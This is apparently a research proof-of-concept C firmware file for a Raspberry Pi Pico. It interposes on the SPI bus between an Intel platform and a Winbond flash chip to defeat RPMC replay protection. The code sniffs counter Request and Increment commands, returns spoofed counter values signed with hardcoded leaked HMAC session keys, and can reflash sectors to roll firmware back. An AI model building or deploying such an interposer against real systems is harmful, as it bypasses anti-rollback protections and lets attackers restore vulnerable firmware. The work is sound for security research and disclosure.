// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 Christian Werling
// Copyright (c) 2026 Matti Finder
// Copyright (c) 2026 Hans Niklas Jacob
// Copyright (c) 2026 Julian Prein
// Copyright (c) 2026 Niclas Kühnapfel
// Copyright (c) 2026 Jean-Pierre Seifert

#include <pico/stdlib.h>
#include <pico/binary_info.h>
#include <pico/multicore.h>
#include <hardware/spi.h>
#include <hardware/clocks.h>
#include <mbedtls/md.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "rpmc.h"
#include "flash.h"
#include "request_sniffer.pio.h"
#include "increment_sniffer.pio.h"
#include "read_interposer.pio.h"
#include "intel_flash_rollback.h"
#include "board_v2.h"

#define HMAC_KEY_SIZE 32

// TODO: The bitmask is unnecessary for the 24 shifts
inline uint32_t reverse(const uint32_t x)
{
	return ((x & UINT32_C(0x000000FF)) << 24)
	       | ((x & UINT32_C(0x0000FF00)) << 8)
	       | ((x & UINT32_C(0x00FF0000)) >> 8)
	       | ((x & UINT32_C(0xFF000000)) >> 24);
}

// Values for flash state 399093a25b1b61aeb4caf0de42522fba
static uint32_t counter_values[] = { 0xCF6, 0xCD4 };

// Leaked session keys for key_data 0x1 from our target
const static uint8_t leaked_keys[4 * HMAC_KEY_SIZE] = {
	// Key Slot 0
	0xf4, 0x27, 0xad, 0xa3, 0x76, 0x79, 0x6f, 0x27,
	0x78, 0x10, 0x78, 0xb2, 0x0a, 0x6c, 0x68, 0x79,
	0x69, 0x3b, 0x90, 0x35, 0x1b, 0x99, 0x5a, 0xe5,
	0x3b, 0x7c, 0x6e, 0x14, 0x54, 0x6c, 0x69, 0xaa,
	// Key Slot 1
	0x1b, 0x3b, 0x9d, 0x0f, 0xd0, 0x78, 0xee, 0x45,
	0xc1, 0x28, 0xe3, 0xdb, 0x8d, 0x4d, 0xac, 0x6d,
	0x67, 0x21, 0x1a, 0xe6, 0xb6, 0x64, 0x43, 0x27,
	0x7e, 0x10, 0xcd, 0x62, 0x1b, 0x42, 0x08, 0x15,
	// Key Slot 2
	0x3d, 0xfd, 0x42, 0x26, 0x75, 0x56, 0x74, 0x73,
	0x2b, 0x72, 0x71, 0xb3, 0x59, 0xb1, 0xe9, 0x5c,
	0xd4, 0x8c, 0x8e, 0xf9, 0x55, 0x4f, 0xf2, 0x5d,
	0x5b, 0x25, 0x19, 0xc5, 0x24, 0x02, 0xe7, 0x68,
	// Key Slot 3
	0x5e, 0x7d, 0x55, 0xcd, 0x06, 0xbb, 0x1e, 0x07,
	0x91, 0xe6, 0x3b, 0xc3, 0x8a, 0x9b, 0xa0, 0xff,
	0x27, 0xd6, 0x3b, 0x75, 0x53, 0xdc, 0xf7, 0x0d,
	0x31, 0x4e, 0x83, 0xb6, 0x03, 0x6d, 0xaf, 0xa9
};

/* Reverse byte order in chunks of 4, in place. */
static void u32_into_u8(uint32_t *u32, uint8_t *u8, size_t count)
{
	size_t i;
	uint32_t word;

	for (i = 0; i < (count / 4); ++i) {
		word = u32[i];
		u8[i * 4 + 0] = (word >> 24) & 0xFF;
		u8[i * 4 + 1] = (word >> 16) & 0xFF;
		u8[i * 4 + 2] = (word >> 8) & 0xFF;
		u8[i * 4 + 3] = word & 0xFF;
	}

	word = u32[i];
	for (size_t j = 0; j < (count % 4); ++j)
		u8[i * 4 + j] = (word >> (24 - 8 * j)) & 0xFF;
}

/* Assumes shift direction is set to left since otherwise put_blocking can be
 * used as is.
 */
static inline void pio_sm_put_byte_blocking(PIO pio, uint sm, uint8_t data)
{
	pio_sm_put_blocking(pio, sm, data << 24);
}

void interposer_wait_for_command()
{
	pio_sm_put_blocking(interposer.pio, interposer.sm, 1 << 31);
}

void interposer_send_short_status(enum rpmc_status_short status)
{
	pio_sm_put_blocking(interposer.pio, interposer.sm,
	                    sizeof(status) * 8 - 1);
	pio_sm_put_byte_blocking(interposer.pio, interposer.sm, status);
}

void interposer_send(const uint8_t *data, const uint32_t count)
{
	size_t i;
	uint32_t word;

	// put bit count
	pio_sm_put_blocking(interposer.pio, interposer.sm, count * 8 - 1);

	// put data in words
	uint32_t words = count & ~0b11;
	for (i = 0; i < words; i += 4) {
		word = 0;
		word |= data[i + 0] << 24;
		word |= data[i + 1] << 16;
		word |= data[i + 2] << 8;
		word |= data[i + 3];
		pio_sm_put_blocking(interposer.pio, interposer.sm, word);
	}

	if (i >= count)
		return;

	// put last 1-3 bytes
	word = 0;
	for (size_t j = 0; j < (count % 4); ++j)
		word |= data[i + j] << (24 - 8 * j);
	pio_sm_put_blocking(interposer.pio, interposer.sm, word);
}

/*
 * Intel + Winbond strategy:
 *
 * Let all OP1s pass through, but fake the OP2 responses for Request and
 * Increment commands (also tracking the latter to update the spoofed counter
 * value). With the Request replies we return the spoofed counter values and the
 * Increments replies are needed because otherwise the counter value mismatch
 * would get flagged in the status by the chip. We use the leaked HMAC key to
 * sign the long status replies.
 *
 * Update commands are not of interest to us, because we already know that Intel
 * uses the same KeyData.
 */
void interpose_intel()
{
	// tell the first SM to match RPMC request commands
	pio_sm_put_blocking(req_sniff.pio, req_sniff.sm, RPMC_REQUEST);

	// tell the interposer SM to match OP2
	pio_sm_put_byte_blocking(interposer.pio, interposer.sm, RPMC_OP2);
	// pre-fill the FIFO with a busy wait message
	interposer_send_short_status(WAIT);

	// tell the third SM to match RPMC increment commands
	pio_sm_put_blocking(inc_sniff.pio, inc_sniff.sm, RPMC_INCREMENT);

	// TODO: do this via the pis_smX_rx_fifo_not_empty interrupts?
	while (true) {
		if (!pio_sm_is_rx_fifo_empty(req_sniff.pio, req_sniff.sm)) {
			// Request command

			union rpmc_request req;
			union rpmc_read_data status = { .status = DONE };

			// get the command bytes
			for (unsigned i = 0; i < count_of(req.words); ++i)
				req.words[i] = pio_sm_get_blocking(
					req_sniff.pio, req_sniff.sm);

#if 0
			print_rpmc_request(req);
#endif

			// at this point we already sent the pre-filled busy
			// message, so we don't need to worry about that here

			// fix byte order of everything
			u32_into_u8(req.words, req.buf, sizeof(req.buf));

			// calculate the signature using the leaked key
			memcpy(status.tag, req.tag, sizeof(status.tag));
			status.val = reverse(counter_values[req.idx]);
			mbedtls_md_hmac(
				mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
				leaked_keys + HMAC_KEY_SIZE * req.idx,
				HMAC_KEY_SIZE, status.tag,
				sizeof(status.tag) + sizeof(status.val),
				status.sig);
			static_assert(sizeof(status.sig) == HMAC_KEY_SIZE);

#if 0
			print_rpmc_read_data(status);
#endif

			// send a short ready message
			interposer_send_short_status(DONE);

			// send the long status
			interposer_send(status.buf, sizeof(status.buf));

			// tell the SM to wait for the next command
			interposer_wait_for_command();

			// fill the FIFO with a busy wait message again
			interposer_send_short_status(WAIT);

		} else if (!pio_sm_is_rx_fifo_empty(inc_sniff.pio,
		                                    inc_sniff.sm)) {
			// Increment command

			union rpmc_increment inc;

			// get the command bytes
			for (unsigned i = 0; i < count_of(inc.words); ++i)
				inc.words[i] = pio_sm_get_blocking(
					inc_sniff.pio, inc_sniff.sm);

			// at this point we already sent the pre-filled busy
			// message, so we don't need to worry about that here

			// fix byte order of everything
			u32_into_u8(&inc.words[0], &inc.buf[0], 4);

#if 1
			print_rpmc_increment(inc);
#endif

			if (inc.idx > 1)
				continue;

			if (counter_values[inc.idx] != inc.old) {
				printf("c%d mismatch: %08x != %08x\n", inc.idx,
				       counter_values[inc.idx], inc.old);
				counter_values[inc.idx] = inc.old;
			}

			counter_values[inc.idx]++;

			// Send a done message.
			interposer_send_short_status(DONE);

			// Even though there is no more data, we noticed that
			// the Read command is executed in the long form too on
			// Intel. We will simply send 0xFF... after the status
			interposer_send_short_status(DONE);

			// tell the SM to wait for the next command
			interposer_wait_for_command();

			// fill the FIFO with a busy wait message again
			interposer_send_short_status(WAIT);
		}
	}
}

void reprogram_flash(spi_inst_t *const out_spi, const unsigned int cs)
{
	for (unsigned i = 0; i < count_of(sector); ++i)
		write_segment(out_spi, cs, sector_addr[i], sector_len[i],
		              sector[i]);
}

void init_mux()
{
#ifdef PIN_MUX_ENABLE
	// Enable the mux (active low)
	gpio_init(PIN_MUX_ENABLE);
	gpio_put(PIN_MUX_ENABLE, 0);
	//gpio_set_drive_strength(PIN_MUX_ENABLE, GPIO_DRIVE_STRENGTH_8MA);
	gpio_set_dir(PIN_MUX_ENABLE, GPIO_OUT);
#endif

	gpio_init(PIN_MUX_INTERPOSE);
	gpio_set_slew_rate(PIN_MUX_INTERPOSE, GPIO_SLEW_RATE_FAST);
	// TODO: do we still need this?
	gpio_set_drive_strength(PIN_MUX_INTERPOSE, GPIO_DRIVE_STRENGTH_2MA);
	gpio_set_dir(PIN_MUX_INTERPOSE, GPIO_OUT);

	// The mux behaved sometimes inconsistent in our testing, especially when
	// used for the first time after turning on. To make it more reliable, prime
	// the mux by switching it to target <-> pico and driving the muxed MISO pin
	// a couple of times.
	//
	// TODO: do we still need this?
	gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_PICO);
	sleep_us(100);
	for (unsigned i = 0; i < 10; ++i) {
		gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
		sleep_us(1);
		gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
	}
	sleep_us(100);
	gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_CHIP);
	sleep_us(1);

	// Select target <-> pico
	gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_PICO);
	// Set muxed MISO to 0xFF by default
	gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
}

void init_flashing_pins()
{
	// TODO: how high can we go?
	spi_init(PICO_CHIP_SPI_INST, 2 * 1000 * 1000);

	// We can't use the SPI function for CS because then every byte will be send
	// in a separate CS transaction
	gpio_init(PIN_PICO_CHIP_SPI_CS);
	gpio_put(PIN_PICO_CHIP_SPI_CS, 1);
	gpio_set_dir(PIN_PICO_CHIP_SPI_CS, GPIO_OUT);

	gpio_set_function(PIN_PICO_CHIP_SPI_CLK, GPIO_FUNC_SPI);
	gpio_set_function(PIN_PICO_CHIP_SPI_RX, GPIO_FUNC_SPI);
	gpio_set_function(PIN_PICO_CHIP_SPI_TX, GPIO_FUNC_SPI);

	sleep_us(100);
}

// Set a gpio to floating / high impedance
void gpio_set_highz(uint gpio)
{
	gpio_set_function(gpio, GPIO_FUNC_NULL);
	gpio_disable_pulls(gpio);
	gpio_set_input_enabled(gpio, false);
}

int main()
{
	// Overclock
	set_sys_clock_khz(250000, true);

	// Initialize stdio
	stdio_init_all();
	sleep_ms(1000);

	// Configure voltage switcher (TPS2116DRL)
	gpio_init_mask64((1 << PIN_CHIP_VOLT_MODE) | (1 << PIN_CHIP_VOLT_SEL));
	gpio_put(PIN_CHIP_VOLT_MODE, 1); // enable switching voltage
	gpio_put(PIN_CHIP_VOLT_SEL, 1); // use target voltage
	gpio_set_dir_out_masked64((1 << PIN_CHIP_VOLT_MODE)
	                          | (1 << PIN_CHIP_VOLT_SEL));

	// Configure SPI capture pins
	gpio_init_mask64((1 << PIN_PICO_BOARD_SPI_MOSI_DQ0)
	                 | (1 << PIN_PICO_BOARD_SPI_CLK)
	                 | (1 << PIN_PICO_BOARD_SPI_HOLD_DQ3)
	                 | (1 << PIN_PICO_BOARD_SPI_WP_DQ2)
	                 | (1 << PIN_PICO_BOARD_SPI_MISO_DQ1)
	                 | (1 << PIN_PICO_BOARD_SPI_CS));
	gpio_set_dir_in_masked64((1 << PIN_PICO_BOARD_SPI_MOSI_DQ0)
	                         | (1 << PIN_PICO_BOARD_SPI_CLK)
	                         | (1 << PIN_PICO_BOARD_SPI_HOLD_DQ3)
	                         | (1 << PIN_PICO_BOARD_SPI_WP_DQ2)
	                         | (1 << PIN_PICO_BOARD_SPI_MISO_DQ1)
	                         | (1 << PIN_PICO_BOARD_SPI_CS));
	// TODO: do we still need this?
	gpio_disable_pulls(PIN_PICO_BOARD_SPI_MISO_DQ1);

	// Configure the chip flashing pins. While we're not using them they
	// need to be configured as floating to not disturb the target <-> chip
	// communication
	gpio_set_highz(PIN_PICO_CHIP_SPI_RX);
	gpio_set_highz(PIN_PICO_CHIP_SPI_CS);
	gpio_set_highz(PIN_PICO_CHIP_SPI_CLK);
	gpio_set_highz(PIN_PICO_CHIP_SPI_TX);

	// Configure the muxed MISO output pin
	gpio_init(PIN_PICO_OUT_SPI_MISO_DQ1);
	gpio_set_dir(PIN_PICO_OUT_SPI_MISO_DQ1, GPIO_OUT);
	gpio_set_slew_rate(PIN_PICO_OUT_SPI_MISO_DQ1, GPIO_SLEW_RATE_FAST);
	gpio_set_drive_strength(PIN_PICO_OUT_SPI_MISO_DQ1,
	                        GPIO_DRIVE_STRENGTH_12MA);

	// Configure and prime the mux
	init_mux();

switch_case:
	printf("Enter option [ir]\n");
	switch (getchar()) {
	case 'i':
		// Let the target speak with the chip
		gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_CHIP);

		// Init all PIO state machines
		request_sniffer_init(PIN_PICO_BOARD_SPI_CS,
		                     PIN_PICO_BOARD_SPI_CLK,
		                     PIN_PICO_BOARD_SPI_MOSI_DQ0);
		read_interposer_init(PIN_PICO_BOARD_SPI_CS,
		                     PIN_PICO_BOARD_SPI_CLK,
		                     PIN_PICO_BOARD_SPI_MOSI_DQ0,
		                     PIN_PICO_OUT_SPI_MISO_DQ1,
		                     PIN_MUX_INTERPOSE);
		increment_sniffer_init(PIN_PICO_BOARD_SPI_CS,
		                       PIN_PICO_BOARD_SPI_CLK,
		                       PIN_PICO_BOARD_SPI_MOSI_DQ0);

		printf("c0 = %08x\n", counter_values[0]);
		printf("c1 = %08x\n", counter_values[1]);

		printf("Interposing Intel\n");
		interpose_intel();
		break;

	case 'r':
		// Disconnect the chip from the target
		gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_PICO);
		sleep_ms(1);

		init_flashing_pins();

		printf("Reprogramming flash sectors...\n");
		reprogram_flash(PICO_CHIP_SPI_INST, PIN_PICO_CHIP_SPI_CS);
		printf("done\n");

		// Make the flashing pins floating again
		gpio_set_highz(PIN_PICO_CHIP_SPI_RX);
		gpio_set_highz(PIN_PICO_CHIP_SPI_CS);
		gpio_set_highz(PIN_PICO_CHIP_SPI_CLK);
		gpio_set_highz(PIN_PICO_CHIP_SPI_TX);
		break;

	case 't':
		printf("Test\n");

		while (getchar()) {
			printf("Toggle\n");
			gpio_xor_mask(1 << PIN_MUX_INTERPOSE);
		}
		break;

	default: // do nothing just leave chip directly connected
		gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_PICO);
		printf("Just passing traffic through\n");
		break;
	}

	while (true)
		tight_loop_contents();

	return 0;
}